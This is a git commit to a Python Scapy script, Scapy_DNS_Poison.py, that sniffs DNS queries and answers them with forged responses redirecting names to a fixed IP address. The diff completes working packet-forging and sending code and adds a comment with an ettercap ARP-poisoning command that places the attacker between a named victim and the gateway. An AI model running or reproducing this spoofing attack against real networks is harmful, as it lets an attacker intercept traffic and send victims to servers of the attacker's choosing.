b03608af99489ce1b7fef76f29fbf279700975c2
Angel Hernandez <ah.sec7@gmail.com>
2014-10-29 15:21:03 -0600

    Added Send DNS spoofed packet. Modified the way the packet was created (there were some DNS flags missing Tested using ettercap (instructions are in the comments) It seems to be working fine now !!! :)

--- Scapy_DNS_Poison.py
+++ Scapy_DNS_Poison.py
@@ -13,6 +13,9 @@ from scapy.all import *
 # 
 # Inspired by: http://danmcinerney.org/reliable-dns-spoofing-with-python-scapy-nfqueue/
 
+# Tested with a 3rd device, using ettercap 
+# ettercap --iface wlo2 -T -M arp:remote /192.168.1.1// /192.168.1.3//
+# Where 192.168.1.1 is the gateway and 192.168.1.3 is the victim     <- This command allows a computer (running ettercap) to create a MiTM to sniff and inject (DNS spoof) traffic
 
 def run_dns_spoof():
   # Sniffing, looking for DNS traffic
@@ -24,12 +27,28 @@ def run_dns_spoof():
       print pkts[0][DNS].qd
       print pkts[0][IP].dst
       # When query detected we will craft a spoofed DNS Response
-      resp = IP(proto = 'udp', src = pkts[0][IP].dst, dst = pkts[0][IP].src)/\
-             UDP(sport = pkts[0][UDP].dport, dport = pkts[0][UDP].sport) /\
-             DNS(qr = 1, opcode ='QUERY', aa = 1, ancount = 1, qd = pkts[0][DNS].qd, an=DNSRR(rrname=pkts[0][DNS].qd.qname, rdata = '167.206.145.40'))
-      print '%s' %(resp)
+      if pkts[0][UDP].sport != 53:
+        deport = pkts[0][UDP].sport
+      else: 
+        deport = pkts[0][UDP].dport
+      resp = IP(proto = 'udp', src = pkts[0][IP].dst, dst = pkts[0][IP].src, id = pkts[0][IP].id)/\
+             UDP(sport = 53, dport = deport) /\
+             DNS(id = pkts[0][DNS].id, qr = 1L, opcode ='QUERY', aa = 1L, rd = 1L, ancount = 1, qd = pkts[0][DNS].qd, an=DNSRR(rrname=pkts[0][DNS].qd.qname, ttl = 80, rdata = '167.206.145.40'))
+      print '#'*50
+      print '-[Req Detectado]'
+      print pkts[0].show()
+      print '%s' %(resp.show())
+      sendp(Ether()/resp, iface = 'wlo2')
+      send(resp)
+      send(resp)
+      send(resp)
+      print 'Packet sent'
+      print '#'*50
     if DNSRR in pkts[0]:
+      print '#'*50
       print '+[Rsp Detectado]'
+      print pkts[0].show()
+      print '#'*50
 
 def main():
   run_dns_spoof()
